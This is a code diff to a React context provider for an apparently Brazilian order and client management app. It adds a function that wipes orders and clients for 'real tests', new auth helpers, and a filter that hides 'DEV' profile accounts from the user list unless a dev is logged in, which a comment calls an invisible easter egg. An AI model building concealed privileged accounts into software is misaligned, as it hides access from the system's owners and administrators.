@@ -110,6 +110,16 @@ export const AppProvider = ({ children }) => {
     showToast('Dados restaurados com sucesso!', 'success');
   }, [ordersHook, estoqueHook, clientesHook, precoBrutoHook, showToast]);
 
+  // Zerar pedidos e clientes para testes reais mantendo produtos
+  const zerarSistema = useCallback(() => {
+    DB.zerarParaProducao();
+    ordersHook.setOrders(DB.getPedidos());
+    clientesHook.setClients(DB.getClientes());
+    clientesHook.setCarpenters(DB.getCarpinteiros());
+    setEmployees(DB.getFuncionarios());
+    showToast('Sistema zerado para testes reais! Clientes e pedidos estão 0.', 'success');
+  }, [ordersHook, clientesHook, showToast]);
+
   // Gestão de Funcionários / Equipe
   const [users, setUsers] = useState(() => DB.getUsuarios());
 
@@ -211,14 +221,17 @@ export const AppProvider = ({ children }) => {
     setCurrentUser: authHook.setCurrentUser,
     switchUser: authHook.switchUser,
     login: authHook.login,
+    logout: authHook.logout,
+    isDev: authHook.isDev,
     isAdmin: authHook.isAdmin,
+    hasPermission: authHook.hasPermission,
 
-    // Equipe & Contas de Acesso
+    // Equipe & Contas de Acesso (Conta DEV oculta em modo invisível / easter egg)
     employees,
     setEmployees,
     saveEmployee,
     deleteEmployee,
-    users,
+    users: authHook.isDev ? users : users.filter(u => u.perfil !== 'DEV'),
     setUsers,
     saveUser,
     deleteUser,
@@ -238,7 +251,8 @@ export const AppProvider = ({ children }) => {
     closePrintModal,
     togglePrintMode,
     refreshAll,
-    resetDemo
+    resetDemo,
+    zerarSistema
   };
 
   return (
